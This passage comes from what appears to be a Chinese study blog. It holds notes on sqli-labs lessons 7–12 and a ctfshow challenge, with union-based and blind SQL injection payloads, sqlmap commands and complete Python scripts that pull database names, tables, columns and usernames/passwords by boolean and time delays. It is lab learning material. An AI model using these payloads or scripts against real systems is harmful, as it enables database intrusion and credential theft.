class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>不加<span class="hljs-keyword">and</span>后面的话好像会把其它库的同名表下的字段爆出来<br></code></pre></td></tr></table></figure><p>最后爆库：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>应该是加了检查，password不能为空</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure><p>回显  </p><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb  </p></blockquote><p>成功闭合sql查询,然后走流程通关。</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-06</title>
    <link href="/2025/03/05/note-06/"/>
    <url>/2025/03/05/note-06/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-less9"><a href="#sql-labs-less9" class="headerlink" title="sql-labs-less9"></a>sql-labs-less9</h1><p>题目说了是单引号闭合，然后怎么尝试都返回</p><blockquote><p>You are in………..  </p></blockquote><p>没有登录是否成功回显，没有sql报错回显<br>意思就是只能用时间延迟来判断注入是否正确，无法像less8能用respond长度来判断是否正确了<br>使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep()<br>和<br>if<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure><p>来构造payload,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,1,sleep(2)) --+</span><br></code></pre></td></tr></table></figure><p>意思是如果数据库第一个字符为’s’，则返回1（true）,否则则延迟回显<br>基于此原理</p><p>KIMI：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>ALPHABET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br>URL = <span class="hljs-string">&quot;http://sqli-labs.com/Less-9/?id=1&#x27; and substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27; and sleep(&#123;time&#125;)--+&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()<br>    response = requests.get(path)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    position = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 判断是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 尝试每个字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># 获取数据库名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;database()&quot;</span>))<br><br><span class="hljs-comment"># 获取表名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取字段名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取用户名和密码</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(username,&#x27;~&#x27;,password) from users&quot;</span>))<br></code></pre></td></tr></table></figure><p>叫kimi加了注释，自己小改了一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure><p>我发现把逗号放最前面就不容易丢逗号了。</p><h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>就是把less9的单引号闭合改为双引号闭合：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and if(substr(database(),1,1)=&#x27;s&#x27;,1,sleep(2)) --+<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-05</title>
    <link href="/2025/03/04/note-05/"/>
    <url>/2025/03/04/note-05/</url>
    
    <content type="html"><![CDATA[<h1 id="修正sql-labs-less7错误"><a href="#修正sql-labs-less7错误" class="headerlink" title="修正sql-labs-less7错误"></a>修正sql-labs-less7错误</h1><p>实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，<br>上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败<br>问了kimi  </p><blockquote><p>为什么<br>?id&#x3D;-1’)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>而<br>?id&#x3D;-1’)) select table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>不生效  </p></blockquote><p>KIMI:</p><blockquote><p><em><strong>为什么UNION SELECT是关键？</strong></em><br>UNION SELECT的作用是把两个查询的结果合并在一起，而不是直接替换原始查询。它要求两个查询的列数和数据类型匹配，但只要满足这些条件，就能让注入的语句与原始查询兼容。而直接的SELECT语句没有这种兼容性，直接破坏了原始查询的结构，导致语法错误。<br><em><strong>数据库的执行逻辑决定了这一切</strong></em><br>数据库在解析SQL语句时，会严格按照语法规则执行。如果注入的语句破坏了原始查询的结构，数据库会报错。这种报错可能不会直接显示给用户，但会导致注入失败。第一个语句通过UNION SELECT与原始查询兼容，所以能成功；第二个语句直接破坏了原始查询的语法，所以失败。<br><em><strong>权限和路径不是问题</strong></em><br>INTO OUTFILE操作需要数据库户具有FILE权限，而且目标路径必须有效。但既然第一个语句已经成功，说明权限和路径都没有问题。第二个语句失败的原因完全在于语法错误，而不是权限或路径。  </p></blockquote><p>原来联合注入漏洞叫<em><strong>联合</strong></em>是这个原理</p><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>该题测试没有报错回显，只有登录是否成功回显<br>只能用盲注了，<br>sqlmap或上次less5的脚本都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --batch --dbs<br><br>--batch表示碰到选择时选用默认选项，--dbs表示爬取所有数据库名<br>-D  库名 --tables表示爬取某数据库下的所有表<br>-D 库名 -T 表名--columns表示爬取某库下某表的所有列<br></code></pre></td></tr></table></figure><p>less5脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-8/&quot;</span> <br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span> <br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span> <br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    target_table = <span class="hljs-string">&quot;users&quot;</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>顺便学习一下ctfshow web8 的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/&#x27;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br> <br><span class="hljs-comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">45</span>):<br>    <span class="hljs-comment"># 获取当前使用的数据库</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取当前数据库的所有表</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的字段</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的数据</span><br>    payload = <span class="hljs-string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)<br>    <span class="hljs-comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>        result = requests.get(url + payload % (i, j))<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;If&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>            name += <span 